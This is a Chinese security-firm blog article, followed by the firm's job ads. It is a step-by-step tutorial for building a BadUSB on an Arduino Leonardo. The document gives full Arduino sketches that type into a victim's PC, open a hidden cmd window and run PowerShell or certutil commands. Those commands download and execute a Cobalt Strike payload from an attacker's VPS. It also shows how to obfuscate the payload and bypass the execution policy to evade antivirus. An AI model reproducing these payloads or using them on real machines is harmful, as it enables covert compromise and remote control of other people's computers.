> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/hsKIR-KeXf0SrRl8-Fw_TQ)

_**声明**_

由于传播、利用此文所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，雷神众测以及文章作者不为此承担任何责任。  
雷神众测拥有对此文章的修改和解释权。如欲转载或传播此文章，必须保证此文章的完整性，包括版权声明等全部内容。未经雷神众测允许，不得任意修改或者增减此文章内容，不得以任何方式将其用于商业目的。

_**No.1  
**_

_**前期准备**_

**购买一个 badusb**

首先我们需要一个 badusb

![图片](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JXBsxCrZcI8UEdY9nUg3FynLNHJePPiaAKtMrDKm3P78ibrnibHibvfCFSvsYFicYN5QK9o02Iawib6b09Q/640?wx_fmt=png)

这里我们使用 Leonardo 型号的

**烧录软件的选择**

这里我们选择 Arduino 简单方便

官网下载地址：

https://www.arduino.cc/en/Main/Software

**windows 下 IDE 的设置**

如果是相同的 badusb 可以按照我的设置来

前提是要把 badusb 插入到电脑上再进行设置

![图片](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JXBsxCrZcI8UEdY9nUg3FynpOMMZnY22C6bj5PaZ2DFiawbkgiboDTiacco4T30icKiccbOibIKqZFaFb5w/640?wx_fmt=png)

![图片](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JXBsxCrZcI8UEdY9nUg3FynwiceiacTiaAWeBXDpOYZKXBvEKVFquhBEjCYibiblo9n6iapnwHdPROeVfsA/640?wx_fmt=png)

_**_**No.2**_**_

_**储备知识准备**_

**Keyboard 函数**

Keyboard.begin(): 开启键盘通信

Keyboard.end(): 结束键盘通信

Keyboard.print(): 模拟键盘输入字符

Keyboard.press(): 按下键盘某一键

Keyboard.release(): 松开键盘某一键

Keyboard.releaseAll(): 松开所有键

Keyboard.write(): 模拟键盘输出 ASCII 码或 Hex 值对应的按键

_**_**No.3**_**_

_**调用 cmd 缩小隐藏指令**_

cmd /q /d /f:off /v:on /k MODE con: cols=15 lines=1// 有回显

cmd /T:01 /K "@echo off && mode con:COLS=15 LINES=1// 无回显

/q 关闭回显  
/d 禁止从注册表执行 AutoRun 命令  
/F:OFF 禁用文件和目录名完成字符  
/V:ON 使用 ! 作为分隔符启用延迟的环境变量  
MODE con: cols=15 lines=1 调整行数和列数

**对应按键表**  

![图片](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JXBsxCrZcI8UEdY9nUg3FynFNO6QQSibddW7I61FsC7JL9rIicej1LLjoDicVYRfUZ0ORK1lM7TYXGmA/640?wx_fmt=png)

![图片](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JXBsxCrZcI8UEdY9nUg3Fyn0do6mRZEau2JhVFa0xWmaiaicMZ0WCGuLfDRiaYVpbe9wOYvCjqibvseLw/640?wx_fmt=png)

![图片](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JXBsxCrZcI8UEdY9nUg3Fyn2LpEtBpGSInUgoU5j744pdG99l2KIkPvIvjHjib78DwpMlGekxUCYCg/640?wx_fmt=png)

现在我们基本具备了一个可以编写简单 badusb 程序的基础了

_**_**No.4**_**_

_**上线实现**_

刚开始的 usb 的初始代码是这样的，我们这里编写的主要函数是 setup 下面的，可以不用管

```
void setup() {
  // 安装时运行的代码
}

void loop() {
  // 重复执行的代码
}
```

```
# include <Keyboard.h>

void setup() {
    // 安装时运行的代码
    Keyboard.begin(); //开始键盘通讯
    delay(3000);//延迟

    // 打开 运行 窗口
    // 按住win键 + r
    Keyboard.press(KEY_LEFT_GUI);
    Keyboard.press('r');
    delay(100);
    // 松开win键 + r
    Keyboard.release(KEY_LEFT_GUI);
    Keyboard.release('r');
    delay(100);

    // 开大写输小写绕过输入法
    Keyboard.press(KEY_CAPS_LOCK);
    Keyboard.release(KEY_CAPS_LOCK);
    delay(100);

    // 执行命令-打开cmd
    Keyboard.println("CMD  /q /d /f:off /v:on /k MODE con: cols=20 lines=1");
    delay(100); 
    Keyboard.press(KEY_RETURN);
    delay(100);
    Keyboard.release(KEY_RETURN);
    delay(100);

    // 执行命令-cs上线powershell一句话马
    Keyboard.press(KEY_RETURN);
    delay(100);
    Keyboard.release(KEY_RETURN);
    delay(100);
    Keyboard.println("powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('vps/a'))""); //需要执行的代码
    delay(100);
    Keyboard.press(KEY_RETURN);
    delay(100);
    Keyboard.release(KEY_RETURN);
    delay(3000);

    // 退出终端
    Keyboard.println("exit"); //需要执行的代码
    delay(100);
    Keyboard.press(KEY_RETURN);
    delay(100);
    Keyboard.release(KEY_RETURN);

    // 结束监听
    Keyboard.end();//结束键盘通讯 
}
 
void loop() {
    // put your main code here, to run repeatedly:
}
```

这只能针对没有杀软的情况下，可以一击必杀上线成功。

_**_**No.5**_**_

_**简单的混淆**_

```
流程
1.制作混淆ps1
2.插入badusb
3.1 证书远程请求下载ps1并运行
3.2 powershell远程rce 无文件落地
4.上线
```

**制作混淆 ps1**

这里我们使用 Invoke-Obfuscation 进行二次混淆

github 的下载地址：

https://github.com/danielbohannon/Invoke-Obfuscation 

**cs 生成 ps1**

![图片](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JXBsxCrZcI8UEdY9nUg3FynBNbZWC6MiaILrTqCG3PooJBZR5kDHyYWicNAzib17OqzA7hYavdJqumZw/640?wx_fmt=png)

![图片](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JXBsxCrZcI8UEdY9nUg3FynlYjzy7uCuPsK9SDdFclYYlFiaeZwBJq5QBkrKibdy96ta5Uk31avYreQ/640?wx_fmt=png)

扫描结果

然后我们拿出我们的神器二次混淆

可能会报错？！  
win10 x64 系统 Import-Module 无法加载文件，提示此系统上禁止运行脚本。

**二次混淆 ps1**

1. 管理员权限下运行：Set-ExecutionPolicy Unrestricted

![图片](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JXBsxCrZcI8UEdY9nUg3Fyncsq7pomocm6v1pZmEQvLQaRPWEcBX5panzoiciaFHuYBACbGEibO7skuw/640?wx_fmt=png)

2.Import-Module ./Invoke-Obfuscation.psd1  

3.Invoke-Obfuscation

![图片](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JXBsxCrZcI8UEdY9nUg3Fyn8icnZDCyVjhV6GzXbUTFh4oJPAW0WaQaOWspS90iaAGS9fNXoHPU1C4g/640?wx_fmt=png)

![图片](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JXBsxCrZcI8UEdY9nUg3FynOlJc2ibicFge8s2WS4J5O277RVUrI7mBGMXLBv4ppiaHViafardB2N3wzg/640?wx_fmt=png)

4.set scriptpath 文件位置. ps1

![图片](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JXBsxCrZcI8UEdY9nUg3FynEjPawibN0zb15VibaY0iaVavBBiaM03nK2yynLgbA2PJnWbK4SeKyZz6Iw/640?wx_fmt=png)

5.encoding 选择混淆的方式

![图片](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JXBsxCrZcI8UEdY9nUg3FynVt1NLBicXtjiaadX1lt4cLaNkLdvuDvm4Rc0WEzOzxAwAL0tdIttzn7g/640?wx_fmt=png)

这里我选择混淆两次 ascii 按两次 1 两次回车就完事儿了

![图片](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JXBsxCrZcI8UEdY9nUg3FynQcooOtrobWBGwLRIMGsLiajtQibiabCaFHXuSR0jGoRVamwQzN3iaic0b6Q/640?wx_fmt=png)

6.out 文件位置 输出文件

![图片](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JXBsxCrZcI8UEdY9nUg3FynCDk1obYuricdsKlicSQMlemd44ibpcCFSarzyXLGeBBajhibicsokiazYGQg/640?wx_fmt=png)

生成 payload2

![图片](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JXBsxCrZcI8UEdY9nUg3FynjSzso9fGu9UAjemQrUjIqtwFpeJOyj44V6RhraKwk05icRWiaE5PSwoA/640?wx_fmt=png)

其他一样过

**远程下载**

**certutil 证书下载 (可过部分杀软，但有些过不去)**

我们使用 certutil 证书远程下载

Windows 有一个名为 CertUtil 的内置程序，可用于在 Windows 中管理证书。使用此程序可以在 Windows 中安装，备份，删除，管理和执行与证书和证书存储相关的各种功能。

CertUtil 的一个特性是能够从远程 URL 下载证书或任何其他文件。

```
certutil.exe -urlcache -split -f  vps/payload2.ps1 1.ps1  # 从vps上下载payload2.ps1 保存为1.ps1
```

vps 同样要使用 python -m SimpleHTTPServer 端口来开启一个服务器

**编写代码**

```
# include <Keyboard.h>
void setup() {
// putpower shell your setup code here, to run once
Keyboard.begin();//开始键盘通讯
delay(3000);//延时
Keyboard.press(KEY_LEFT_GUI);//win键
Keyboard.press('r');//r键
delay(100);
Keyboard.release(KEY_LEFT_GUI);
Keyboard.release('r');
delay(100);
Keyboard.press(KEY_CAPS_LOCK);//利用开大写输小写绕过输入法
Keyboard.release(KEY_CAPS_LOCK);
delay(200);
//Keyboard.println("CMD  /q /d /f:off /v:on /k MODE con: cols=15 lines=1");  //有回显
Keyboard.println("cmd /T:01 /K "@echo  off && mode con:COLS=15 LINES=1"");   //无回显 
delay(200);
Keyboard.press(KEY_RETURN);
Keyboard.release(KEY_RETURN);
delay(200);
Keyboard.println("certutil.exe -urlcache -split -f  vps/payload2.ps1  1.ps1"); //证书下载ps脚本
delay(3000);
Keyboard.println("powershell.exe -executionpolicy bypass -file 1.ps1"); //本地权限绕过执行木马脚本
Keyboard.press(KEY_RETURN);
Keyboard.release(KEY_RETURN);
Keyboard.press(KEY_CAPS_LOCK);
Keyboard.release(KEY_CAPS_LOCK);
Keyboard.end();//结束键盘通讯
}
void loop() {
// put your main code here, to run repeatedly:
}
```

**powershell 混淆远程执行命令 (可过国内大部分主流杀软)**

这是初始的 powershell 远程执行命令，但一般都会被杀软拦截

```
powershell -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('vps/payload2.ps1'))"
```

我们进行变量和管道符脏数据等混淆最终的命令如下

```
cmd /c "set x=p@owershell & echo %x:@=^^"^^"^^"^^"%;"$a='iex ((new-object net.webclient).downl';$b='oadstring(''vps/payload2.ps1''))';iex($a+$b)" | cmd"
```

编写我们的代码

**编写代码**

```
//由于@无法在badusb中出现和编译 于是我们简化了一下混淆 实测也能过大部分杀软
# include <Keyboard.h>
void setup() {
// putpower shell your setup code here, to run once
Keyboard.begin();//开始键盘通讯
delay(3000);//延时
Keyboard.press(KEY_LEFT_GUI);//win键
Keyboard.press('r');//r键
delay(100);
Keyboard.release(KEY_LEFT_GUI);
Keyboard.release('r');
delay(100);
Keyboard.press(KEY_CAPS_LOCK);//利用开大写输小写绕过输入法
Keyboard.release(KEY_CAPS_LOCK);
delay(200);
//Keyboard.println("CMD  /q /d /f:off /v:on /k MODE con: cols=15 lines=1");  //有回显
Keyboard.println("cmd /T:01 /K "@echo  off && mode con:COLS=15 LINES=1"");   //无回显 
delay(200);
Keyboard.press(KEY_RETURN);
Keyboard.release(KEY_RETURN);
delay(200);
Keyboard.println("powershell.exe $a='IEX ((new-object net.webclient).downl';$b='oadstring(''vps/payload2.ps1''))';IEX($a+$b)"); //iex远程rce
Keyboard.press(KEY_RETURN);
Keyboard.release(KEY_RETURN);
Keyboard.press(KEY_CAPS_LOCK);
Keyboard.release(KEY_CAPS_LOCK);
Keyboard.end();//结束键盘通讯
}
void loop() {
// put your main code here, to run repeatedly:
}
```

_**_**No.6**_**_

_**烧录**_

插入 badusb 添加好我们的代码，依次从点击左上角的编译和上传，从而烧录成功

![图片](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JXBsxCrZcI8UEdY9nUg3FynP7r5jIJPib2JQAyPG0fWgqnYg0L15X1bEjUBXdGcfibnvy5Y10fvbTAA/640?wx_fmt=png)

烧录成功之后它会自动运行一遍

  

_**_**No.7**_**_

_**参考博客**_

https://www.bilibili.com/read/cv8101978/  

https://blog.csdn.net/azraelxuemo/article/details/106410110  

https://www.yuque.com/pmiaowu/isxog9/svuld7# Lucm0  

https://www.cnblogs.com/lsgxeva/p/11711425.html

_**招聘启事**_

安恒雷神众测 SRC 运营（实习生）  
————————  
【职责描述】  
1.  负责 SRC 的微博、微信公众号等线上新媒体的运营工作，保持用户活跃度，提高站点访问量；  
2.  负责白帽子提交漏洞的漏洞审核、Rank 评级、漏洞修复处理等相关沟通工作，促进审核人员与白帽子之间友好协作沟通；  
3.  参与策划、组织和落实针对白帽子的线下活动，如沙龙、发布会、技术交流论坛等；  
4.  积极参与雷神众测的品牌推广工作，协助技术人员输出优质的技术文章；  
5.  积极参与公司媒体、行业内相关媒体及其他市场资源的工作沟通工作。  
【任职要求】   
 1.  责任心强，性格活泼，具备良好的人际交往能力；  
 2.  对网络安全感兴趣，对行业有基本了解；  
 3.  良好的文案写作能力和活动组织协调能力。

简历投递至 

bountyteam@dbappsecurity.com.cn

设计师（实习生）

————————

【职位描述】  
负责设计公司日常宣传图片、软文等与设计相关工作，负责产品品牌设计。  
【职位要求】  
1、从事平面设计相关工作 1 年以上，熟悉印刷工艺；具有敏锐的观察力及审美能力，及优异的创意设计能力；有 VI 设计、广告设计、画册设计等专长；  
2、有良好的美术功底，审美能力和创意，色彩感强；精通 photoshop/illustrator/coreldrew / 等设计制作软件；  
3、有品牌传播、产品设计或新媒体视觉工作经历；  
【关于岗位的其他信息】  
企业名称：杭州安恒信息技术股份有限公司  
办公地点：杭州市滨江区安恒大厦 19 楼  
学历要求：本科及以上  
工作年限：1 年及以上，条件优秀者可放宽

简历投递至 

bountyteam@dbappsecurity.com.cn

安全招聘  
————————  
公司：安恒信息  
岗位：Web 安全 安全研究员  
部门：战略支援部  
薪资：13-30K  
工作年限：1 年 +  
工作地点：杭州（总部）、广州、成都、上海、北京

工作环境：一座大厦，健身场所，医师，帅哥，美女，高级食堂…  
【岗位职责】  
1. 定期面向部门、全公司技术分享;  
2. 前沿攻防技术研究、跟踪国内外安全领域的安全动态、漏洞披露并落地沉淀；  
3. 负责完成部门渗透测试、红蓝对抗业务;  
4. 负责自动化平台建设  
5. 负责针对常见 WAF 产品规则进行测试并落地 bypass 方案  
【岗位要求】  
1. 至少 1 年安全领域工作经验；  
2. 熟悉 HTTP 协议相关技术  
3. 拥有大型产品、CMS、厂商漏洞挖掘案例；  
4. 熟练掌握 php、java、asp.net 代码审计基础（一种或多种）  
5. 精通 Web Fuzz 模糊测试漏洞挖掘技术  
6. 精通 OWASP TOP 10 安全漏洞原理并熟悉漏洞利用方法  
7. 有过独立分析漏洞的经验，熟悉各种 Web 调试技巧  
8. 熟悉常见编程语言中的至少一种（Asp.net、Python、php、java）  
【加分项】  
1. 具备良好的英语文档阅读能力；  
2. 曾参加过技术沙龙担任嘉宾进行技术分享；  
3. 具有 CISSP、CISA、CSSLP、ISO27001、ITIL、PMP、COBIT、Security+、CISP、OSCP 等安全相关资质者；  
4. 具有大型 SRC 漏洞提交经验、获得年度表彰、大型 CTF 夺得名次者；  
5. 开发过安全相关的开源项目；  
6. 具备良好的人际沟通、协调能力、分析和解决问题的能力者优先；  
7. 个人技术博客；  
8. 在优质社区投稿过文章；

岗位：安全红队武器自动化工程师  
薪资：13-30K  
工作年限：2 年 +  
工作地点：杭州（总部）  
【岗位职责】  
1. 负责红蓝对抗中的武器化落地与研究；  
2. 平台化建设；  
3. 安全研究落地。  
【岗位要求】  
1. 熟练使用 Python、java、c/c++ 等至少一门语言作为主要开发语言；  
2. 熟练使用 Django、flask 等常用 web 开发框架、以及熟练使用 mysql、mongoDB、redis 等数据存储方案；  
3: 熟悉域安全以及内网横向渗透、常见 web 等漏洞原理；  
4. 对安全技术有浓厚的兴趣及热情，有主观研究和学习的动力；  
5. 具备正向价值观、良好的团队协作能力和较强的问题解决能力，善于沟通、乐于分享。  
【加分项】  
1. 有高并发 tcp 服务、分布式等相关经验者优先；  
2. 在 github 上有开源安全产品优先；  
3: 有过安全开发经验、独自分析过相关开源安全工具、以及参与开发过相关后渗透框架等优先；  
4. 在 freebuf、安全客、先知等安全平台分享过相关技术文章优先；  
5. 具备良好的英语文档阅读能力。

简历投递至 

bountyteam@dbappsecurity.com.cn

岗位：红队武器化 Golang 开发工程师  
薪资：13-30K  
工作年限：2 年 +  
工作地点：杭州（总部）  
【岗位职责】  
1. 负责红蓝对抗中的武器化落地与研究；  
2. 平台化建设；  
3. 安全研究落地。  
【岗位要求】  
1. 掌握 C/C++/Java/Go/Python/JavaScript 等至少一门语言作为主要开发语言；  
2. 熟练使用 Gin、Beego、Echo 等常用 web 开发框架、熟悉 MySQL、Redis、MongoDB 等主流数据库结构的设计, 有独立部署调优经验；  
3. 了解 docker，能进行简单的项目部署；  
3. 熟悉常见 web 漏洞原理，并能写出对应的利用工具；  
4. 熟悉 TCP/IP 协议的基本运作原理；  
5. 对安全技术与开发技术有浓厚的兴趣及热情，有主观研究和学习的动力，具备正向价值观、良好的团队协作能力和较强的问题解决能力，善于沟通、乐于分享。  
【加分项】  
1. 有高并发 tcp 服务、分布式、消息队列等相关经验者优先；  
2. 在 github 上有开源安全产品优先；  
3: 有过安全开发经验、独自分析过相关开源安全工具、以及参与开发过相关后渗透框架等优先；  
4. 在 freebuf、安全客、先知等安全平台分享过相关技术文章优先；  
5. 具备良好的英语文档阅读能力。  
简历投递至 

bountyteam@dbappsecurity.com.cn

![图片](https://mmbiz.qpic.cn/mmbiz_jpg/HxO8NorP4JXBsxCrZcI8UEdY9nUg3FynTC7MObNe44ia4g6jj2assuYKAicYpnFePWiaiaDRG5LuQuVGb62lrZ8FPw/640?wx_fmt=jpeg)

专注渗透测试技术

全球最新网络攻击技术

END

![图片](https://mmbiz.qpic.cn/mmbiz_jpg/HxO8NorP4JXBsxCrZcI8UEdY9nUg3FynXSsOvrTkBl67bMnnzWtibSdGbpuGtuQKlVRtrQHuzBtYKLmG9Hfob9w/640?wx_fmt=jpeg)